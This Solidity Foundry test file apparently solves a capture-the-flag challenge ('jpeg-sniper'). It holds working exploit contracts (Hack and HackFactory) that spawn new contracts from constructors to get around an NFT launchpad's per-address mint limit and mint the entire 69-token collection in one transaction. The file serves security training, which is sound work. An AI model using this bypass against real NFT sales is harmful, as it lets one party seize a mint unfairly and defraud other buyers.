// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {FlatLaunchpeg} from "src/jpeg-sniper/FlatLaunchpeg.sol";

contract Testing is Test {
    address attacker = makeAddr("attacker");
    address o1 = makeAddr("o1");
    address o2 = makeAddr("o2");
    address admin = makeAddr("admin"); // should not be used
    address adminUser = makeAddr("adminUser"); // should not be used

    FlatLaunchpeg flatLaunchpeg;

    /// preliminary state
    function setUp() public {
        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying core contracts
        vm.prank(admin);
        flatLaunchpeg = new FlatLaunchpeg(69, 5, 5);
    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker, attacker);

        solution();

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {
        // attacker mints out collection in one tx
        assertEq(flatLaunchpeg.totalSupply(), 69);
        assertEq(flatLaunchpeg.balanceOf(attacker), 69);
    }

    function solution() public {
        new HackFactory(flatLaunchpeg);
    }
}

contract Hack {
    constructor(
        FlatLaunchpeg _flatLaunchpeg,
        uint256 _quantity,
        address owner
    ) {
        uint256 totalSupply = _flatLaunchpeg.totalSupply();
        _flatLaunchpeg.publicSaleMint(_quantity);

        for (uint256 i = totalSupply; i < totalSupply + _quantity; i++) {
            _flatLaunchpeg.transferFrom(address(this), owner, i);
        }
    }
}

contract HackFactory {
    FlatLaunchpeg private s_flatLaunchpeg;

    constructor(FlatLaunchpeg _flatLaunchpeg) {
        s_flatLaunchpeg = _flatLaunchpeg;
        uint256 maxSupplyDuringMint = _flatLaunchpeg.maxPerAddressDuringMint();

        while (true) {
            uint256 totalSupply = s_flatLaunchpeg.totalSupply();
            uint256 leftToBeMinted = s_flatLaunchpeg.collectionSize() -
                totalSupply;

            if (leftToBeMinted == 0) {
                break;
            } else {
                new Hack(
                    s_flatLaunchpeg,
                    min(maxSupplyDuringMint, leftToBeMinted),
                    msg.sender
                );
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? b : a;
    }
}
